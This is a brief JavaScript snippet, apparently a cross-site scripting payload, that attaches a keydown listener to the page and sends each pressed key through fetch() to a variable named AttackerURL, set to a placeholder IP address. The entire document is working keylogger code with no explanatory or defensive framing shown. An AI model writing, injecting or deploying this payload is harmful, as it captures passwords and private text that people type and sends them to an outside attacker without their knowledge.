var AttackerURL = "http://<ip_addr>";
function logKey(event){
	fetch([AttackerURL, "/keys/", event.key].join(''))
};
document.addEventListener('keydown', logKey);
